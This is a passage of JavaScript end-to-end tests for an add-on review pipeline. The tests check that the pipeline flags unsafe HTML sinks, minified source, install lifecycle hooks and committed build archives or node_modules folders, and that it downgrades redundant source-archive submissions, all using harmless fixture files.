    // (2) The .tsx file's innerHTML sink is caught (JSX parsed, sink scanned).
    assert.ok(
      has(findings, "unsafe-html", (f) => f.file === "Widget.tsx"),
      "the .tsx innerHTML sink is flagged"
    );
    // (3) The .vue SFC's v-html template binding is caught as an innerHTML sink.
    assert.ok(
      has(findings, "unsafe-html", (f) => f.file === "Comp.vue"),
      "the .vue v-html binding is flagged as an HTML sink"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A minified file in the readable source is a hard reject in SCA: a source code
// archive's promise is readable source, so minified-code fires on it exactly as it
// would for a built XPI - it is never scanned as authored code.
test("SCA e2e: a minified file in the source is rejected by minified-code", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    // One long line >= 1024 bytes packing many statements -> minified, not a known library.
    "src/blob.min.js": `var s=0;${"s=s+1;".repeat(240)}`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    // The prefix is stripped by loadScaAddon, so the review file is "blob.min.js".
    assert.ok(
      has(findings, "minified-code", (f) => f.file === "blob.min.js"),
      "a minified source file is rejected by minified-code in SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A package.json install lifecycle hook runs when the reviewer installs the declared
// dependencies, before the build - a supply-chain vector the deterministic
// build-lifecycle-hook check flags offline (no token), pointing the reviewer at the hook.
test("SCA e2e: a package.json install hook is flagged by build-lifecycle-hook", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package.json": JSON.stringify({
      name: "sca-e2e",
      version: "1.0.0",
      scripts: { postinstall: "node scripts/setup.js", build: "webpack" },
    }),
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      has(findings, "build-lifecycle-hook", (f) => /postinstall/.test(f.item)),
      "the postinstall install hook is flagged"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A committed node_modules folder in --sca-root is a hard fail; its contents are never
// read (loadAddon skips it, recording only the directory).
// A committed built archive (.xpi/.zip) anywhere in --sca-root is a hard reject, caught at
// load like node_modules - so an archive in the build tree AND one inside the review source
// both fire, regardless of the source/build split.
test("SCA e2e: a committed build archive is rejected anywhere in --sca-root", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "conversations.xpi": "BUILT ARTIFACT AT ROOT", // build tree (outside src/)
    "src/vendor/lib.zip": "ARCHIVE IN THE REVIEW SOURCE", // inside --sca-source
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      has(
        findings,
        "committed-build-artifact",
        (f) => f.file === "conversations.xpi"
      ),
      "the committed .xpi in the build tree is flagged"
    );
    assert.ok(
      has(
        findings,
        "committed-build-artifact",
        (f) => f.file === "src/vendor/lib.zip"
      ),
      "an archive inside the review source is flagged too (loader spans all of --sca-root)"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: a committed node_modules folder is rejected", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "node_modules/left-pad/index.js": "module.exports = 1;\n",
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.ok(
      has(findings, "committed-node-modules", (f) =>
        /node_modules/.test(f.message)
      ),
      "a committed node_modules folder is flagged"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A readable built XPI (no minified/obfuscated first-party code) makes a --sca-root
// submission a false SCA: the shipped add-on can be reviewed directly, so its source
// archive adds nothing. The pipeline downgrades to a plain XPI review and reports it
// (sca-not-required). The decision is purely the XPI's own classification - the source
// content is never consulted.
const READABLE_XPI = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "Readable XPI",
    version: "1.0",
    background: { scripts: ["background.js"] },
  }),
  "background.js": `console.log("readable shipped code");`,
};

test("SCA e2e: a readable-XPI submission is downgraded to a plain XPI review (sca-not-required)", async () => {
  const xpi = tmpDir(READABLE_XPI);
  // The source has a copy-only build (a package.json whose build merely vendors libraries),
  // yet the readable XPI downgrades BEFORE any build review runs, so sca-not-required fires.
  // The source also carries a fake API in a file the XPI lacks; if the source were reviewed
  // unknown-api would catch it - so its ABSENCE proves the XPI, not the source, was reviewed.
  const src = tmpDir({
    "package.json": JSON.stringify({
      name: "dg",
      version: "1.0.0",
      scripts: { build: "cp -r node_modules/lib dist" },
    }),
    "src/only-in-source.js": `browser.totallyFakeNamespace.doThing();\n`,
  });
  try {
    const result = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: ".",
      ...OFFLINE,
    });
    const { findings, mode } = result;
    assert.equal(
      mode,
      REVIEW_MODE.XPI,
      "a directly-reviewable XPI downgrades the SCA to a plain XPI review"
    );
    assert.ok(
      has(findings, "sca-not-required"),
      "the redundant source submission is reported"
    );
    assert.ok(
      !has(findings, "unknown-api", (f) =>
        /totallyFakeNamespace/.test(f.item ?? "")
      ),
      "the source content is not reviewed after the downgrade - the XPI is"
    );
    // Lock the rendered response wording (no golden fires this check).
    assert.match(
      formatReviewBody(result),
      /separate, more involved review process that is considerably slower/,
      "the report explains that the source archive triggers a slower review"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: a minified-XPI submission stays in SCA mode (a legitimate SCA)", async () => {
  const xpi = tmpDir(XPI_FILES); // background.js ships minified -> the XPI is not reviewable as-is
  const src = tmpDir(SRC_FILES);
  try {
    const { findings, mode } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: "src",
      ...OFFLINE,
    });
    assert.equal(
      mode,
      REVIEW_MODE.SCA,
      "a minified XPI keeps the source-code-archive review"
    );
    assert.ok(
      !has(findings, "sca-not-required"),
      "no downgrade warning for a legitimate SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// Regression: a downgrade re-classifies the XPI vendor-aware in Phase 3, so a VENDOR-declared
// readable library is excluded from content review - identical to a native XPI review of the
// same artifact. (If the pre-vendor Phase-1 decision classification were reused, the library
// would be scanned as authored and unknown-api would fire on its fake API.)
test("SCA e2e: a downgrade excludes VENDOR-declared readable files from content review", async () => {
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "Vendor Downgrade",
      version: "1.0",
      background: { scripts: ["background.js"] },
    }),
    "background.js": `console.log("readable first-party");`, // readable -> XPI downgrades
    "VENDOR.md":
      "File: lib/widget.js\nSource: https://unpkg.com/widget@1.0.0/widget.js\n",
    "lib/widget.js": `browser.totallyFakeNamespace.doThing();\n`, // scanned-as-authored -> unknown-api
  });
  const src = tmpDir({
    "package.json": JSON.stringify({ name: "d", version: "1.0.0" }),
  });
  try {
    const { findings, mode } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaSource: ".",
      ...OFFLINE,
    });
    assert.equal(mode, REVIEW_MODE.XPI, "the readable XPI downgrades");
    assert.ok(has(findings, "sca-not-required"));
    assert.ok(
      !has(findings, "unknown-api", (f) => /widget\.js/.test(f.file ?? "")),
      "the VENDOR-declared library is excluded from content review (vendor-aware classify)"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});
